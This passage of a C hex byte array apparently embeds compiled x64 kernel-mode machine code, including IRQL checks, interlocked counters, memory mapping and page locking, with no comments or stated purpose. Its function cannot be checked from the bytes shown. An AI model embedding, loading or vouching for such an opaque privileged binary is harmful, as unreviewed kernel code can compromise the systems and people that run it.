		0x03, 0xC0, 0x49, 0x8B, 0x8C, 0xC2, 0x50, 0x71, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0xE2, 0x41, 0x00, 0x00, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x4C, 0x0F, 0x20, 0xC0, 0x3C, 0x02, 0x77, 0x08, 0x0F, 0xB6, 0xD2, 0xE8, 0x77, 0x27, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x4C, 0x0F, 0x20, 0xC0, 0x3C, 0x02, 0x77, 0x05, 0xE8, 0xFA, 0x23, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x0C, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xC1, 0x01, 0xFF, 0xC0, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x0C, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xF0, 0x0F, 0xC1, 0x01, 0xFF, 0xC8, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x85, 0xC9, 0x74, 0x08, 0x8B, 0xC2, 0xF0, 0x44, 0x0F, 0xB1, 0x01, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x89, 0x54,
		0x24, 0x10, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x81, 0xEC, 0x38, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xB6, 0x51, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x20, 0x04, 0x00, 0x00, 0x80, 0x3D, 0xC7, 0x51, 0x00, 0x00,
		0x01, 0x75, 0x72, 0x48, 0x85, 0xC9, 0x74, 0x6D, 0x48, 0x8B, 0xD1, 0x4C, 0x8D, 0x84, 0x24, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x20, 0x02, 0x00, 0x00, 0xFF, 0x15, 0xD7, 0x40, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xB8, 0x2B, 0x00, 0x00,
		0x4C, 0x8D, 0x5C, 0x24, 0x20, 0x49, 0x89, 0x03, 0x0F, 0xB6, 0x05, 0xB1, 0x2B, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x20, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0x41, 0xB8, 0xF3, 0x01, 0x00, 0x00, 0x41, 0x88, 0x43, 0x08, 0xFF, 0x15,
		0x9C, 0x40, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x32, 0x27, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x04, 0x00, 0x00, 0xE8, 0x43, 0x27, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x38, 0x04, 0x00, 0x00, 0xC3, 0xB8, 0x0B, 0x80,
		0x6A, 0xC8, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x04, 0x00, 0x00, 0xE8, 0x29, 0x27, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x38, 0x04, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x88, 0x0D, 0x22, 0x51, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0x24, 0x40, 0x00, 0x00, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x33, 0xF6, 0x4C, 0x89, 0x60, 0xF8, 0x4C, 0x89, 0x68,
		0xF0, 0x4D, 0x8B, 0xE0, 0x8B, 0xFA, 0x8B, 0xDE, 0x89, 0x70, 0xD8, 0x48, 0x8B, 0xE9, 0x4C, 0x8D, 0x2D, 0xDB, 0x59, 0x3D, 0x00, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x8B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x4C,
		0x8D, 0x0C, 0x80, 0x33, 0xC0, 0xF0, 0x4B, 0x0F, 0xB1, 0x4C, 0xCD, 0x18, 0x74, 0x14, 0x8B, 0x5C, 0x24, 0x30, 0xFF, 0xC3, 0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x89, 0x5C, 0x24, 0x30, 0x72, 0xD8, 0xEB, 0x04, 0x8B, 0x5C, 0x24, 0x30, 0x44, 0x8B,
		0xC2, 0x48, 0x8D, 0x0D, 0xC8, 0x2B, 0x00, 0x00, 0x8B, 0xD3, 0xE8, 0x81, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x7A, 0x2B, 0x00, 0x00, 0xBA, 0x00, 0x9E, 0xFF, 0x01, 0xE8, 0x70, 0xFE, 0xFF, 0xFF, 0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x0F, 0x83,
		0xC5, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1D, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0xD5, 0xE8, 0x55, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD7, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x87, 0x3F, 0x00,
		0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x6A, 0x3F, 0x00, 0x00, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x48, 0x8B, 0xCF, 0x41, 0x0F, 0xB6, 0xD0, 0xC7, 0x44,
		0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x40, 0x3F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0, 0x75, 0x17, 0x48, 0x8D, 0x0D, 0x79, 0x2A, 0x00, 0x00, 0xE8, 0xF4, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0xCF, 0xFF,
		0x15, 0x1B, 0x3F, 0x00, 0x00, 0xEB, 0x4A, 0x48, 0x8D, 0x0D, 0x32, 0x2A, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0xE8, 0xDA, 0xFD, 0xFF, 0xFF, 0x44, 0x8B, 0xDB, 0x4B, 0x8D, 0x0C, 0x9B, 0x49, 0x89, 0x74, 0xCD, 0x18, 0x49, 0x89, 0x7C, 0xCD, 0x10, 0x49,
		0x89, 0x6C, 0xCD, 0x08, 0x4D, 0x89, 0x64, 0xCD, 0x20, 0x8B, 0x47, 0x2C, 0x48, 0x81, 0xE6, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x03, 0xC6, 0x49, 0x89, 0x44, 0xCD, 0x00, 0xEB, 0x0F, 0x48, 0x8D, 0x0D, 0xC4, 0x29, 0x00, 0x00, 0xE8, 0x9F, 0xFD, 0xFF,
		0xFF, 0x48, 0x8B, 0xC6, 0x4C, 0x8B, 0x6C, 0x24, 0x48, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x48, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x8B, 0xF9, 0x41, 0x8B, 0xD8, 0x74, 0x23, 0x45, 0x85, 0xC0, 0x74, 0x1E, 0x48, 0x8B,
		0xD1, 0x48, 0x8D, 0x0D, 0xD8, 0x2A, 0x00, 0x00, 0x44, 0x8B, 0xC3, 0xE8, 0x40, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x84, 0x3E, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x33, 0xC0,
		0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x68, 0xF0, 0x48, 0x89,
		0x70, 0xE8, 0x4C, 0x89, 0x60, 0xD8, 0x49, 0x8B, 0xE9, 0x48, 0x8B, 0xF1, 0x45, 0x8B, 0xE0, 0x0F, 0x84, 0x5C, 0x01, 0x00, 0x00, 0x45, 0x85, 0xC0, 0x0F, 0x84, 0x53, 0x01, 0x00, 0x00, 0x48, 0x89, 0x58, 0xF8, 0x48, 0x89, 0x78, 0xE0, 0x48, 0x8B,
		0xD1, 0x4C, 0x89, 0x68, 0xD0, 0x48, 0x8D, 0x0D, 0x8C, 0x2C, 0x00, 0x00, 0x45, 0x8B, 0xC4, 0x4C, 0x89, 0x70, 0xC8, 0xE8, 0xC0, 0xFC, 0xFF, 0xFF, 0x4C, 0x8D, 0x2D, 0xC9, 0x57, 0x3D, 0x00, 0x45, 0x33, 0xF6, 0x49, 0x8B, 0xDD, 0x41, 0x8B, 0xFE,
		0x4C, 0x8B, 0x03, 0x48, 0x8D, 0x0D, 0x16, 0x2C, 0x00, 0x00, 0x4C, 0x8B, 0xCE, 0x8B, 0xD7, 0xE8, 0x9C, 0xFC, 0xFF, 0xFF, 0x48, 0x3B, 0x6B, 0x20, 0x75, 0x05, 0x48, 0x3B, 0x33, 0x74, 0x13, 0xFF, 0xC7, 0x48, 0x83, 0xC3, 0x28, 0x81, 0xFF, 0x50,
		0xC3, 0x00, 0x00, 0x72, 0xD3, 0xE9, 0xAA, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xB7, 0x2B, 0x00, 0x00, 0x8B, 0xD7, 0xE8, 0x70, 0xFC, 0xFF, 0xFF, 0x44, 0x8B, 0xDF, 0x4B, 0x8D, 0x1C, 0x9B, 0x4D, 0x39, 0x74, 0xDD, 0x10, 0x74, 0x30, 0x4D, 0x39,
		0x74, 0xDD, 0x18, 0x74, 0x29, 0x48, 0x8D, 0x0D, 0x64, 0x2B, 0x00, 0x00, 0xE8, 0x4F, 0xFC, 0xFF, 0xFF, 0x49, 0x8B, 0x54, 0xDD, 0x10, 0x49, 0x8B, 0x4C, 0xDD, 0x18, 0xFF, 0x15, 0x97, 0x3D, 0x00, 0x00, 0x49, 0x8B, 0x4C, 0xDD, 0x10, 0xFF, 0x15,
		0x64, 0x3D, 0x00, 0x00, 0xEB, 0x0C, 0x48, 0x8D, 0x0D, 0xEB, 0x2A, 0x00, 0x00, 0xE8, 0x26, 0xFC, 0xFF, 0xFF, 0x4D, 0x39, 0x74, 0xDD, 0x08, 0x74, 0x1A, 0x48, 0x8D, 0x0D, 0x98, 0x2A, 0x00, 0x00, 0xE8, 0x13, 0xFC, 0xFF, 0xFF, 0x49, 0x8B, 0x4C,
		0xDD, 0x08, 0x49, 0x8B, 0xD4, 0xFF, 0x15, 0x55, 0x3D, 0x00, 0x00, 0x49, 0x8B, 0x44, 0xDD, 0x18, 0x4D, 0x89, 0x74, 0xDD, 0x10, 0x4D, 0x89, 0x74, 0xDD, 0x08, 0x4D, 0x89, 0x74, 0xDD, 0x00, 0x4D, 0x89, 0x74, 0xDD, 0x20, 0xF0, 0x4D, 0x0F, 0xB1,
		0x74, 0xDD, 0x18, 0x49, 0x8B, 0x54, 0xDD, 0x18, 0x48, 0x8D, 0x0D, 0x09, 0x2A, 0x00, 0x00, 0xE8, 0xD4, 0xFB, 0xFF, 0xFF, 0x4C, 0x8B, 0x6C, 0x24, 0x28, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x81, 0xFF, 0x50, 0xC3, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24,
		0x38, 0x75, 0x12, 0x48, 0x8D, 0x0D, 0x96, 0x29, 0x00, 0x00, 0x45, 0x8B, 0xC4, 0x48, 0x8B, 0xD6, 0xE8, 0xAB, 0xFB, 0xFF, 0xFF, 0x41, 0x8B, 0xC6, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0x4C, 0x8B, 0x64, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48,
		0x8B, 0x6C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0x4C, 0x8B, 0x64, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x6C, 0x24, 0x48, 0x48, 0x89, 0x74, 0x24, 0x50, 0x4C, 0x89, 0x64, 0x24, 0x30, 0xB8, 0x1F, 0x85, 0xEB, 0x51, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x44, 0x8B, 0xE1, 0xBE, 0xE8, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7C,
		0x24, 0x58, 0xF7, 0xE1, 0x8B, 0xEA, 0xC1, 0xED, 0x04, 0x85, 0xED, 0x41, 0x8B, 0xDC, 0x74, 0x1B, 0x8B, 0xFD, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF5, 0x3B, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
		0xCF, 0x75, 0xED, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15, 0xE1, 0x3B, 0x00, 0x00, 0x48, 0xFF, 0xCE, 0x75, 0xCD, 0x4C, 0x8B, 0x64, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x48,
		0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0xD5, 0x4C, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x85,
		0xA6, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x48, 0x89, 0x74, 0x24, 0x40, 0xFF, 0x15, 0x92, 0x3B, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x8A, 0x3B, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x30, 0xBE, 0xE8, 0x03, 0x00, 0x00,
		0x48, 0x8B, 0xE8, 0x48, 0x89, 0x7C, 0x24, 0x48, 0xBB, 0x64, 0x00, 0x00, 0x00, 0x8D, 0x7B, 0x9E, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x55, 0x3B, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
		0xCF, 0x75, 0xED, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15, 0x41, 0x3B, 0x00, 0x00, 0x48, 0xFF, 0xCE, 0x75, 0xCC, 0x33, 0xC9, 0xFF, 0x15, 0x3C, 0x3B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B,
		0x5C, 0x24, 0x30, 0x4C, 0x8B, 0xD8, 0x48, 0xB8, 0x47, 0x08, 0x8F, 0x36, 0x8E, 0x58, 0x8B, 0x4F, 0x4C, 0x2B, 0xDD, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x49, 0xF7, 0xE3, 0x4C, 0x2B, 0xDA, 0x49, 0xD1, 0xEB, 0x4C, 0x03, 0xDA, 0x49, 0xC1, 0xEB, 0x10,
		0x4C, 0x89, 0x1D, 0x29, 0x4C, 0x00, 0x00, 0x49, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x5C, 0x24,
		0x60, 0x48, 0x89, 0x6C, 0x24, 0x68, 0x4C, 0x89, 0x6C, 0x24, 0x48, 0x4C, 0x89, 0x74, 0x24, 0x40, 0x4D, 0x8B, 0xE9, 0x45, 0x33, 0xC9, 0x4C, 0x89, 0x7C, 0x24, 0x38, 0x8B, 0xEA, 0x44, 0x8B, 0xF9, 0x45, 0x8D, 0x51, 0x01, 0x4D, 0x8B, 0xF0, 0x41,
		0x8B, 0xD9, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0xE2, 0x4B, 0x00, 0x00, 0x66, 0x90, 0x8B, 0xC3, 0x4C, 0x8D, 0x04, 0x80, 0x4D, 0x03, 0xC0, 0x33, 0xC0, 0xF0, 0x46, 0x0F, 0xB1, 0x14, 0xC1, 0x74, 0x12, 0xFF, 0xC3, 0x81, 0xFB, 0x50,
		0xC3, 0x00, 0x00, 0x72, 0xE3, 0x49, 0x8B, 0xC1, 0xE9, 0xBE, 0x01, 0x00, 0x00, 0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x73, 0xF0, 0x48, 0x89, 0x74, 0x24, 0x70, 0x48, 0x89, 0x7C, 0x24, 0x78, 0x4C, 0x89, 0x64, 0x24, 0x50, 0x45, 0x8D, 0x24, 0x2F,
		0x41, 0x8B, 0xCC, 0x41, 0x8B, 0xFC, 0xFF, 0x15, 0xE4, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0, 0x0F, 0x84, 0x4D, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x33, 0xD2, 0x48, 0x8B, 0xC8, 0xE8, 0x3B, 0x20, 0x00, 0x00, 0x44, 0x8B, 0xDB,
		0x48, 0x8D, 0x1D, 0x71, 0x4B, 0x00, 0x00, 0x4B, 0x8D, 0x3C, 0x9B, 0x48, 0x8B, 0xCE, 0x48, 0x03, 0xFF, 0x48, 0x89, 0x74, 0xFB, 0x08, 0x44, 0x89, 0x64, 0xFB, 0x2C, 0x89, 0x6C, 0xFB, 0x28, 0xFF, 0x15, 0x53, 0x3A, 0x00, 0x00, 0x85, 0xED, 0x4C,
		0x8B, 0xD8, 0x48, 0x89, 0x44, 0xFB, 0x20, 0x74, 0x2C, 0x33, 0xD2, 0x48, 0xF7, 0xF5, 0x85, 0xD2, 0x74, 0x23, 0x48, 0x8B, 0x74, 0xFB, 0x08, 0x2B, 0xEA, 0x48, 0x8D, 0x54, 0xFB, 0x18, 0x8B, 0xCD, 0x4A, 0x8D, 0x44, 0x1D, 0x00, 0x48, 0x03, 0xF1,
		0x48, 0x8D, 0x4C, 0xFB, 0x10, 0x48, 0x89, 0x02, 0x48, 0x89, 0x31, 0xEB, 0x15, 0x48, 0x8B, 0x44, 0xFB, 0x08, 0x48, 0x8D, 0x54, 0xFB, 0x18, 0x48, 0x8D, 0x4C, 0xFB, 0x10, 0x4C, 0x89, 0x1A, 0x48, 0x89, 0x01, 0x4D, 0x85, 0xED, 0x74, 0x07, 0x48,
		0x8B, 0x02, 0x49, 0x89, 0x45, 0x00, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0xE2, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x09, 0x33, 0xED, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x41, 0x8B, 0xD7, 0x48, 0x89, 0x6C, 0x24, 0x20, 0xFF, 0x15, 0x10, 0x3A, 0x00, 0x00,
		0x48, 0x85, 0xC0, 0x48, 0x89, 0x44, 0xFB, 0x30, 0x0F, 0x84, 0xBB, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xF1, 0x39, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0xFB, 0x30, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0xD0, 0x45, 0x33,
		0xC9, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x89, 0x6C, 0x24, 0x20, 0xFF, 0x15, 0xC5, 0x39, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x4C, 0x8B, 0xD8, 0x48, 0x89, 0x44, 0xFB, 0x38, 0x75, 0x1E, 0x48, 0x8D, 0x0D, 0x09, 0x29, 0x00, 0x00, 0xE8,
		0x74, 0xF8, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0xFB, 0x30, 0xFF, 0x15, 0x99, 0x39, 0x00, 0x00, 0x48, 0x89, 0x6C, 0xFB, 0x30, 0xEB, 0x63, 0x48, 0x8B, 0x44, 0xFB, 0x30, 0x4C, 0x89, 0x74, 0xFB, 0x48, 0x49, 0x81, 0xE3, 0x00, 0xF0, 0xFF, 0xFF, 0x8B,
		0x58, 0x2C, 0x48, 0x8D, 0x05, 0x57, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x90, 0x28, 0x00, 0x00, 0x49, 0x03, 0xDB, 0x48, 0x8B, 0xD3, 0x48, 0x89, 0x5C, 0xF8, 0x40, 0xE8, 0x30, 0xF8, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0xEB, 0x2F, 0x48, 0x8D, 0x0D,
		0x34, 0x28, 0x00, 0x00, 0xE8, 0x1F, 0xF8, 0xFF, 0xFF, 0x48, 0x8D, 0x05, 0x28, 0x4A, 0x00, 0x00, 0x44, 0x8B, 0xDB, 0x4B, 0x8D, 0x0C, 0x9B, 0x48, 0xC1, 0xE1, 0x04, 0x48, 0x03, 0xC8, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x33, 0xED, 0xF0, 0x0F, 0xB1,
		0x29, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x4C, 0x8B, 0x7C, 0x24, 0x38, 0x4C, 0x8B, 0x74, 0x24, 0x40, 0x4C, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48,
		0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x4C, 0x8B, 0xCA, 0x48, 0x8B, 0xD1, 0x74, 0x4C, 0x4D,
		0x85, 0xC9, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x75, 0x47, 0x33, 0xFF, 0x4C, 0x8D, 0x05, 0xBE, 0x49, 0x00, 0x00, 0x8B, 0xC7, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x41, 0x0F, 0x18, 0x88, 0xC0, 0x03, 0x00, 0x00,
		0x49, 0x3B, 0x08, 0x74, 0x54, 0xFF, 0xC0, 0x49, 0x83, 0xC0, 0x50, 0x3D, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE6, 0x48, 0x8D, 0x0D, 0x4F, 0x28, 0x00, 0x00, 0xE8, 0x6A, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x38, 0xC3,
		0x33, 0xFF, 0x48, 0x8D, 0x0D, 0xAF, 0x49, 0x00, 0x00, 0x8B, 0xC7, 0x66, 0x90, 0x66, 0x66, 0x90, 0x0F, 0x18, 0x89, 0xC0, 0x03, 0x00, 0x00, 0x4C, 0x3B, 0x09, 0x75, 0x06, 0x48, 0x3B, 0x51, 0xF8, 0x74, 0x0F, 0xFF, 0xC0, 0x48, 0x83, 0xC1, 0x50,
		0x3D, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE1, 0xEB, 0xB9, 0x3D, 0x50, 0xC3, 0x00, 0x00, 0x73, 0xB2, 0x48, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x8D, 0x1C, 0x80, 0x48, 0x89, 0x74, 0x24, 0x28, 0x48, 0x8D, 0x35, 0x23, 0x49, 0x00, 0x00, 0x48, 0x03, 0xDB,
		0x48, 0x83, 0x7C, 0xDE, 0x08, 0x00, 0x74, 0x30, 0x4D, 0x85, 0xC9, 0x74, 0x20, 0x48, 0x8B, 0x54, 0xDE, 0x30, 0x48, 0x85, 0xD2, 0x74, 0x16, 0x48, 0x8B, 0x4C, 0xDE, 0x38, 0xFF, 0x15, 0x46, 0x38, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0xDE, 0x30, 0xFF,
		0x15, 0x13, 0x38, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0xDE, 0x08, 0xFF, 0x15, 0x40, 0x38, 0x00, 0x00, 0x48, 0x89, 0x7C, 0xDE, 0x18, 0x48, 0x89, 0x7C, 0xDE, 0x10, 0x89, 0x7C, 0xDE, 0x28, 0x89, 0x7C, 0xDE, 0x2C, 0x48, 0x89, 0x7C, 0xDE, 0x20, 0x48,
		0x89, 0x7C, 0xDE, 0x08, 0x48, 0x89, 0x7C, 0xDE, 0x30, 0x48, 0x89, 0x7C, 0xDE, 0x38, 0x48, 0x89, 0x7C, 0xDE, 0x40, 0x48, 0x89, 0x7C, 0xDE, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x3C, 0xDE, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48,
		0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x8B, 0x44, 0x24, 0x60, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x89, 0x4C, 0x24,
		0x20, 0x4D, 0x8B, 0xC8, 0x45, 0x33, 0xC0, 0xE8, 0x54, 0xFC, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x74,
